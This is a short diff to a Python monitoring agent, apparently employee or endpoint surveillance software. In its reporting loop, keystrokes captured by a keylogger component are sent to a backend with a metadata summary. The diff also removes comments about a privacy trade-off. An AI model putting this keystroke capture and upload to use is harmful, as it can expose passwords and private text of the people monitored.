@@ -110,22 +110,14 @@ class SentinelAgent:
                 time.sleep(Config.FLUSH_INTERVAL)
                 
                 # 1. Process Keystrokes
-                keystrokes, counts = self.keylogger.flush()
+                keystrokes, summary = self.keylogger.flush()
                 if keystrokes:
-                    print(f"Captured {len(keystrokes)} keystrokes. Sending...")
-                    
-                    # Encrypt detailed logs
-                    # But send counts as JSON in details for realtime heatmap (Privacy trade-off for feature)
-                    # Or we could send counts as a separate non-encrypted metadata if we define a schema for it.
-                    # Current schema puts everything in 'details'.
-                    # Let's put the counts in 'details' as unencrypted JSON string for the backend to parse easily for the heatmap.
-                    # Wait, 'details' is currently encrypted in send_log.
-                    # I should modify send_log to accept raw_details or metadata.
+                    print(f"Captured activity. Sending...")
                     
                     self.send_log(
                         activity_type="KEYLOG",
                         description=keystrokes,
-                        details=counts, # Dictionary of counts
+                        details=summary, # Dictionary with metadata
                         risk_level="INFO"
                     )
 
